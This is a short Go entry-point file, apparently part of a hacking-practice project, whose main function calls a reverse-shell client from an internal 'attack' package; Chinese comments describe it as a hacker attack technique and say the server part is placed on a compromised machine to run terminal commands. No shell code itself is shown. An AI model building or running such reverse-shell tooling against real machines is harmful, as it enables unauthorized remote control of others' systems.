package main

import (
	attack "demon/internal/attack"
)

func main() {
	//黑客攻擊技巧-反向shell
	/*
		Server端要獨立放在被駭的機器上, 再啟動Client執行終端機指令
	*/
	attack.ReverseShellClient()
}
